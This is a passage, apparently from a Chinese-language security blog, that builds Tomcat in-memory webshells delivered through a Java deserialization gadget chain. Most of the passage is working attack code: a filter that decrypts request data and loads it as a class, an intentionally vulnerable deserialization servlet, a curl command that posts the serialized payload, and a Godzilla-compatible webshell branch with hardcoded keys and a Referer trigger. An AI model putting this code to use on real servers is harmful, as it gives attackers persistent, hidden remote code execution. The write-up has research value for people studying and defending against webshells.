&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">putValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;u&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">k&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Cipher&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Cipher&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;AES&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">init&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">2&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">SecretKeySpec&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">k&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBytes&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#d88200">&amp;#34;AES&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">method&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.ClassLoader&amp;#34;&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">getDeclaredMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;defineClass&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">evilclass_byte&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">doFinal&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">sun&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">misc&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">BASE64Decoder&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">decodeBuffer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getReader&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">readLine&lt;/span>&lt;span style="color:#f92672">()));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">evilclass&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getClassLoader&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#111">evilclass_byte&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">evilclass_byte&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">evilclass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">pageContext&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// e.printStackTrace();
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>写一个反序列化接口来测试一下效果&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.servlet.ServletException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.servlet.annotation.WebServlet&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.servlet.http.HttpServlet&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.servlet.http.HttpServletRequest&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.servlet.http.HttpServletResponse&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@WebServlet&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/cc&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CCServlet&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">HttpServlet&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">doGet&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">HttpServletRequest&lt;/span> &lt;span style="color:#111">req&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">HttpServletResponse&lt;/span> &lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">ServletException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">inputStream&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">req&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">objectInputStream&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">inputStream&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">objectInputStream&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ClassNotFoundException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printStackTrace&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getWriter&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Success&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">doPost&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">HttpServletRequest&lt;/span> &lt;span style="color:#111">req&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">HttpServletResponse&lt;/span> &lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">ServletException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">inputStream&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">req&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getInputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">objectInputStream&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">inputStream&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">objectInputStream&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ClassNotFoundException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printStackTrace&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getWriter&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Success&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>先编译TomcatInject.java，再运行CC11Template，生成的ser文件就是最终payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 虽然我把三梦师傅的TomcatEcho和TomcatInject和在一起了 但注意数据包仍然需要发送两次&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl &lt;span style="color:#d88200">&amp;#34;http://127.0.0.1:8088/cc&amp;#34;&lt;/span> --data-binary &lt;span style="color:#d88200">&amp;#34;@./cc11Test4.ser&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220602204040825.png" alt="image-20220602204040825">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220602204148346.png" alt="image-20220602204148346">&lt;/p>
&lt;h3 id="接入哥斯拉">接入哥斯拉&lt;/h3>
&lt;p>哥斯拉的流量比冰蝎的简单多了，加密内容在参数pass中 以post方式发出，详细分析参见Y4er师傅的&lt;a href="https://y4er.com/post/solve-the-problem-of-godzilla-memory-shell-pagecontext/">解决哥斯拉内存马pagecontext的问题&lt;/a>&lt;/p>
&lt;p>继续融入我们原本的filter，代码如下&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// omit
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getHeader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Referer&amp;#34;&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">equalsIgnoreCase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;https://www.sohu.com/&amp;#34;&lt;/span>&lt;span style="color:#f92672">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// default: pass=pass, key=key, xc=md5(key)[:16]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">pass&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;pass&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">xc&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;3c6e0b8a9c15224a&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">md5&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">md5&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">pass&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">xc&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;here&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64Decode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getParameter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">pass&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">xc&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">payload&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">){&lt;/span> &lt;span style="color:#75715e">// 在类中提前声明 `Class payload;`
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">URLClassLoader&lt;/span> &lt;span style="color:#111">urlClassLoader&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">URLClassLoader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">URL&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">],&lt;/span> &lt;span style="color:#111">Thread&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">currentThread&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getContextClassLoader&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">defMethod&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ClassLoader&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;defineClass&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">TYPE&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">TYPE&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">defMethod&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">defMethod&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">urlClassLoader&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">arrOut&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">arrOut&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getWriter&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">md5&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">substring&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">16&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
